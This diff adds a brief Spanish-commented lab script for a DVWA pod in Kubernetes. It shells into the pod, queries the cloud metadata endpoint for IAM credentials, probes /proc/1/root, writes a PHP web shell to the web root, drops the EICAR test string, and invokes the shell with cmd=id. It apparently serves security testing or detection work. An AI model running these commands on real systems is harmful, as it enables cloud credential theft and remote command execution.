@@ -1,0 +1,18 @@
+#Comando para ingresa a los pods (via shell)
+
+kubectl exec -it dvwa-deployment-796dcbf797-gj6bh -- /bin/sh
+
+#comandos para ejecutar dentro del pod
+
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+ls -lah /proc/1/root/
+echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
+echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > eicar.com.txt
+
+#comando para obtener la url del servicio web
+
+kubectl get services
+
+#Query para poner en el browser
+
+http://your-url/shell.php?cmd=id
